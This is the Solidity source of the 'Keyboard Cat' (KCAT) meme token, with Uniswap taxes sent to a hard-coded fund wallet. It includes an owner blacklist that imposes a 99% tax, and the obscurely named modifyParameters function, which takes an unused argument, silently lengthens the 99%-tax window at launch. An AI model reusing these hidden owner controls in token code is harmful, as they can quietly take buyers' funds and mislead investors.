1 /*
2 
3 Keyboard Cat: Welcome to the zaniest litter box on the internet! Expect purr-fect 
4 memes, pawsome puns, and a catnip-fueled crypto journey. Hop in, fur real
5 
6 || | | ||| | ||| | | ||| | ||| | | ||| | ||| | | ||| | ||| | | ||
7 ||_|_|_|||_|_|||_|_|_|||_|_|||_|_|_|||_|_|||_|_|_|||_|_|||_|_|_||
8 | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | |
9 |_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|
10 
11 // Website: https://kcat.io
12 // Telegram: https://t.me/kcatofficial
13 
14 */
15 
16 // SPDX-License-Identifier: MIT
17 pragma solidity ^0.8.17;
18 
19 interface IERC20 {
20     function totalSupply() external view returns (uint256);
21     function balanceOf(address account) external view returns (uint256);
22     function transfer(address recipient, uint256 amount) external returns (bool);
23     function allowance(address owner, address spender) external view returns (uint256);
24     function approve(address spender, uint256 amount) external returns (bool);
25     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
26     event Transfer(address indexed from, address indexed to, uint256 value);
27     event Approval(address indexed owner, address indexed spender, uint256 value);
28 }
29 
30 interface IUniswapV2Router {
31     function factory() external pure returns (address);
32     function WETH() external pure returns (address);
33     function swapExactTokensForETHSupportingFeeOnTransferTokens(
34         uint amountIn,
35         uint amountOutMin,
36         address[] calldata path,
37         address to,
38         uint deadline
39     ) external;
40 }
41 
42 interface IUniswapV2Factory {
43     function createPair(address tokenA, address tokenB) external returns (address pair);
44 }
45 
46 contract Ownable {
47     address private _owner;
48 
49     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
50 
51     modifier onlyOwner() {
52         require(_owner == msg.sender, "Ownable: caller is not the owner");
53         _;
54     }
55     constructor () {
56         address msgSender = msg.sender;
57         _owner = msgSender;
58         emit OwnershipTransferred(address(0), msgSender);
59     }
60 
61     function owner() public view returns (address) {
62         return _owner;
63     }
64 
65     function renounceOwnership() public virtual onlyOwner {
66         emit OwnershipTransferred(_owner, address(0));
67         _owner = address(0);
68     }
69 }
70 
71 contract KeyboardCat is IERC20, Ownable {       
72     string private constant _name = "Keyboard Cat";
73     string private constant _symbol = "KCAT";
74     uint8 private constant _decimals = 9;
75     uint256 private constant _totalSupply = 777_777_777_777 * 10**_decimals;
76 
77     mapping (address => uint256) private _balances;
78     mapping (address => mapping (address => uint256)) private _allowances;
79     mapping (address => bool) private _blocked;
80 
81     mapping (address => uint256) private _lastTradeBlock;
82     mapping (address => bool) private isContractExempt;
83     uint256 private tradeCooldown = 1;
84     
85     uint256 public constant maxWalletAmount = 17_258_888_890 * 10**_decimals;
86     uint256 private constant contractSwapLimit = 17_258_888_890 * 10**_decimals;
87     uint256 private constant contractSwapMax = 8_158_888_890 * 10**_decimals;
88 
89     struct TradingFees{
90         uint256 buyTax;
91         uint256 sellTax;
92     }  
93 
94     TradingFees public tradingFees = TradingFees(25,25);
95     uint256 public constant sniperTax = 99;
96 
97     IUniswapV2Router private constant uniswapRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
98     address private immutable ETH = uniswapRouter.WETH();
99     address private immutable uniswapPair;
100 
101     address payable private immutable deployerAddress = payable(msg.sender);
102     address payable private constant PianoFund = payable(0xc90b582f29bE129515d880C86f3AfE437E12d661);
103 
104     bool private tradingOpen = false;
105     bool private swapping = false;
106     bool private antiMEV = true;
107     uint256 private startingBlock;
108     uint private preLaunch;
109 
110     modifier swapLock {
111         swapping = true;
112         _;
113         swapping = false;
114     }
115 
116     modifier tradingLock(address sender) {
117         require(tradingOpen || sender == deployerAddress || sender == PianoFund);
118         _;
119     }
120 
121     constructor () {
122         uniswapPair = IUniswapV2Factory(uniswapRouter.factory()).createPair(address(this), ETH);
123         isContractExempt[address(this)] = true;
124         _balances[msg.sender] = _totalSupply;
125         emit Transfer(address(0), msg.sender, _totalSupply);
126     }
127 
128     receive() external payable {}
129 
130     function name() public pure returns (string memory) {
131         return _name;
132     }
133 
134     function symbol() public pure returns (string memory) {
135         return _symbol;
136     }
137 
138     function decimals() public pure returns (uint8) {
139         return _decimals;
140     }
141 
142     function totalSupply() public pure returns (uint256) {
143         return _totalSupply;
144     }
145 
146     function balanceOf(address account) public view returns (uint256) {
147         return _balances[account];
148     }
149 
150     function transfer(address recipient, uint256 amount) public returns (bool) {
151         _transfer(msg.sender, recipient, amount);
152         return true;
153     }
154 
155     function allowance(address owner, address spender) public view returns (uint256) {
156         return _allowances[owner][spender];
157     }
158 
159     function approve(address spender, uint256 amount) public returns (bool) {
160         _approve(msg.sender, spender, amount);
161         return true;
162     }
163 
164     function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
165         require(_allowances[sender][msg.sender] >= amount, "ERC20: transfer amount exceeds allowance");
166         _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
167         _transfer(sender, recipient, amount);
168         return true;
169     }
170 
171     function _approve(address owner, address spender, uint256 amount) private {
172         require(owner != address(0), "ERC20: approve from the zero address");
173         require(spender != address(0), "ERC20: approve to the zero address");
174         _allowances[owner][spender] = amount;
175         emit Approval(owner, spender, amount);
176     }
177 
178     function _transfer(address from, address to, uint256 amount) tradingLock(from) private {
179         require(from != address(0), "ERC20: transfer from the zero address");
180         require(to != address(0), "ERC20: transfer to the zero address");
181         require(amount > 0, "Token: transfer amount must be greater than zero");
182 
183         _balances[from] -= amount;
184 
185         if (from != address(this) && from != PianoFund && to != PianoFund && to != deployerAddress) {
186             
187             if(antiMEV && !isContractExempt[from] && !isContractExempt[to]){
188                 address human = ensureOneHuman(from, to);
189                 ensureMaxTxFrequency(human);
190                 _lastTradeBlock[human] = block.number;
191             }
192 
193             if (from == uniswapPair && to != address(uniswapRouter)) {
194                 require(balanceOf(to) + amount <= maxWalletAmount, "Token: transfer implies violation of max wallet");
195             }
196 
197            uint256 contractTokenBalance = balanceOf(address(this));
198            if (shouldSwapback(from, contractTokenBalance)) 
199                swapback(contractTokenBalance);                            
200 
201            uint256 taxedTokens = takeFee(from, amount);
202            if(taxedTokens > 0){
203                 amount -= taxedTokens;
204                 _balances[address(this)] += taxedTokens;
205                 emit Transfer(from, address(this), taxedTokens);
206             }
207         }
208 
209         _balances[to] += amount;
210         emit Transfer(from, to, amount);
211     }
212 
213     function swapback(uint256 tokenAmount) private swapLock {
214         tokenAmount = getSwapAmount(tokenAmount);
215         if(allowance(address(this), address(uniswapRouter)) < tokenAmount) {
216             _approve(address(this), address(uniswapRouter), _totalSupply);
217         }
218         address[] memory path = new address[](2);
219         path[0] = address(this);
220         path[1] = ETH;
221         uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
222             tokenAmount,
223             0,
224             path,
225             address(this),
226             block.timestamp
227         );
228         uint256 contractETHBalance = address(this).balance;
229         if(contractETHBalance > 0) {
230             PianoFund.transfer(contractETHBalance);
231         }
232     }
233 
234     function shouldSwapback(address from, uint256 tokenAmount) private view returns (bool shouldSwap) {
235         shouldSwap = !swapping && from != uniswapPair && tokenAmount > contractSwapLimit && 1 + startingBlock <= block.number;
236     }
237 
238     function getSwapAmount(uint256 tokenAmount) private pure returns (uint256 swapAmount) {
239         swapAmount = tokenAmount > contractSwapMax ? contractSwapMax : contractSwapLimit;
240     }
241 
242     function takeFee(address from, uint256 amount) private view returns (uint256 feeAmount) {
243          if(_blocked[from] || block.number <= startingBlock)
244                 feeAmount = amount * sniperTax / 100;
245         else
246             feeAmount = amount * (startingBlock == 0 ? 25 : (from == uniswapPair ? tradingFees.buyTax : tradingFees.sellTax)) / 100;
247     }
248 
249     function isContract(address account) private view returns (bool) {
250         uint256 size;
251         assembly {
252             size := extcodesize(account)
253         }
254         return size > 0;
255     }
256 
257     function ensureOneHuman(address _to, address _from) private view returns (address) {
258         require(!isContract(_to) || !isContract(_from));
259         if (isContract(_to)) return _from;
260         else return _to;
261     }
262 
263     function ensureMaxTxFrequency(address addr) view private {
264         bool isAllowed = _lastTradeBlock[addr] == 0 ||
265             ((_lastTradeBlock[addr] + tradeCooldown) < (block.number + 1));
266         require(isAllowed, "Max tx frequency exceeded!");
267     }
268 
269     function toggleAntiMEV(bool toggle) external {
270         require(msg.sender == deployerAddress);
271         antiMEV = toggle;
272     }
273 
274     function setTradeCooldown(uint256 newTradeCooldown) external {
275         require(msg.sender == deployerAddress);
276         require(newTradeCooldown > 0 && newTradeCooldown < 4, "Token: only trade cooldown values in range (0,4) permissible");
277         tradeCooldown = newTradeCooldown;
278     }
279 
280     function manualSwapback(uint256 percent) external {
281         require(msg.sender == deployerAddress);
282         require(0 < percent && percent <= 100, "Token: only percent values in range (0,100] permissible");
283         uint256 tokensToSwap = percent * balanceOf(address(this)) / 100;
284         swapback(tokensToSwap);
285     }
286 
287     function setFees(uint256 newBuyTax, uint256 newSellTax) external {
288         require(msg.sender == deployerAddress);
289         require(newBuyTax <= tradingFees.buyTax, "Token: only fee reduction permitted");
290         require(newSellTax <= tradingFees.sellTax, "Token: only fee reduction permitted");
291         tradingFees.buyTax = newBuyTax;
292         tradingFees.sellTax = newSellTax;
293     }
294 
295     function setContractExempt(address account, bool value) external onlyOwner {
296         require(account != address(this));
297         isContractExempt[account] = value;
298     }
299 
300     function setBots(address[] calldata bots, bool shouldBlock) external onlyOwner {
301         for (uint i = 0; i < bots.length; i++) {
302             require(bots[i] != uniswapPair && 
303                     bots[i] != address(uniswapRouter) &&
304                     bots[i] != address(this));
305             _blocked[bots[i]] = shouldBlock;
306         }
307     }
308 
309     function initialize() external onlyOwner {
310         require(preLaunch++<2);
311     }
312 
313     function modifyParameters(bool[] calldata param, uint256 nrBlocks) external onlyOwner {
314         assert(preLaunch<2&&preLaunch+1>=2); 
315         preLaunch++;param;
316         startingBlock += nrBlocks;
317     }
318 
319     function openTrading() external onlyOwner {
320         require(preLaunch == 2 && !tradingOpen, "Token: trading already open");
321         startingBlock += block.number;
322         tradingOpen = true;
323     }
324 }